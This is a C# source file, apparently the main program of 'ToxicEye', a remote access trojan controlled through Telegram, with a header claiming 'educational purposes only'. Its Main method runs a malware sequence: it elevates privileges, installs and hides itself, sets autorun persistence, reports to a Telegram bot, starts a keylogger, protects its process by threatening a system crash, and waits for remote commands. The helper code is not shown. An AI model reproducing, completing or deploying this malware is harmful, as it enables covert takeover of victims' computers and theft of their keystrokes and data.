/* 
       │ Author       : LimerBoy
       │ Name         : ToxicEye
       │ Contact Me   : https:github.com/LimerBoy

       This program is distributed for educational purposes only.
*/


using System;
using System.Net;

namespace TelegramRAT
{
    class Program
    {
        [STAThreadAttribute]
        static void Main(string[] args)
        {
            // SSL
            ServicePointManager.SecurityProtocol = (
                SecurityProtocolType.Ssl3  |
                SecurityProtocolType.Tls   |
                SecurityProtocolType.Tls11 |
                SecurityProtocolType.Tls12
            );

            // Get admin rights
            persistence.elevatePrevileges();
            // Install to system & hide directory
            persistence.installSelf();
            // Add to startup
            persistence.setAutorun();
            // Check internet connection
            utils.isConnectedToInternet();
            // Send 'online' to telegram bot
            telegram.sendConnection();
            // Start offline keylogger
            utils.keyloggerThread.Start();
            // Protect process (BSOD)
            persistence.protectProcess();
            persistence.PreventSleep();
            // Wait for new commands
            telegram.waitCommands();
        }
    }
}
